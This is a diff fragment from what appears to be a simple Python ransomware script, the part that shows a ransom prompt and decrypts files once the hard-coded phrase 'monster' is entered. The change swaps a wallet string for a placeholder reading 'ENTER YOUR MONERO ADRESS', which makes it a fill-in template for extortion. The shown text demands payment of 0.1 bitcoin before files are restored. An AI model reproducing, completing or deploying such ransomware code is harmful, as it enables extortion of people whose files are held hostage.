@@ -15,7 +15,7 @@ with open ("thekey.key", "rb") as key:
     secretkey =key.read()
 
 secret_phrase = "monster"
-user_phrase = input ("Enter a secret phrases to decrypt the files after you pay me 0.1 bitcoin at this adress '0x082838R8ufefuizh37493794948GHJEZHE383920' ")
+user_phrase = input ("Enter a secret phrases to decrypt the files after you pay me 0.1 bitcoin at this adress 'ENTER YOUR MONERO ADRESS' ")
 if secret_phrase == user_phrase :
     for file in files:
         with open(file, "rb") as thefile:
